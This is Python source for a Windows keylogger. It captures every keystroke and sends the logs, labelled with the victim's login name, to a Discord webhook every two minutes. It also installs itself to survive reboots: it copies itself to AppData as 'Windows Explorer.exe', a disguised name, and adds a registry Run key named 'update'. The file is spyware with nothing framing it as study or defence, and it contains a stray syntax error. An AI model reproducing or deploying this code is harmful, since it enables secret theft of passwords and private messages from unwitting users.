import keyboard as kb,os
from threading import Timer as tm
from datetime import datetime as dt
from discord_webhook import DiscordWebhook as dw, DiscordEmbed as de
import shutil as sh
import subprocess as sp, sys
        
SE = 120
WH = "YOUR_WEBHOOK"
        
class Klg: 
    def __init__(self, i, rm="webhook"):
        self.bp()
        now = dt.now()
        self.i = i
        self.rm = rm
        self.l = ""
        self.sd = now.strftime('%d/%m/%Y %H:%M')
        self.ed = now.strftime('%d/%m/%Y %H:%M')
        self.u = os.getlogin()
        
    def bp(self):
        fl = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(fl):kk
            sh.copyfile(sys.executable, fl)
            sti = sp.STARTUPINFO()
            sti.dwFlags |= sp.STARTF_USESHOWWINDOW
            sp.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + fl + '"', startupinfo=sti)
                   
    def cb(self, e):
        n = e.name
        if len(n) > 1:
            if n == "space":
                n = " "
            elif n == "enter":
                n = "[ENTER]\n"
            elif n == "decimal":
                n = "."
            else:
                n = n.replace(" ", "_")
                n = " ["+n.upper()+"] " 
        self.l = self.l + n
        
    def rwh(self):
        f = False
        wb = dw(url=WH)
        if len(self.l) > 2000:
            f = True
            p = os.environ["temp"] + "\\report.txt"
            with open(p, 'w+') as fl:
                fl.write("Klg Report From "+self.u+" Time: "+self.ed+"\n\n")
                fl.write(self.l)
            with open(p, 'rb') as f:
                wb.add_file(file=f.read(), filename='report.txt')
        else:
            eb = de(title="Klg Report From "+self.u+" Time: "+self.ed, description=self.l)
            wb.add_embed(eb)    
        wb.execute()
        if f:
            os.remove(p)
        
    def rpt(self):
        if self.l:
            if self.rm == "webhook":
                self.rwh()    
        self.l = ""
        timer = tm(interval=self.i, function=self.rpt)
        timer.daemon = True
        timer.start()
        
    def s(self):
        self.sd = dt.now()
        kb.on_release(callback=self.cb)
        self.rpt()
        kb.wait()
        
            
if __name__ == "__main__":
    klg = Klg(i=SE, rm="webhook")    
    klg.s()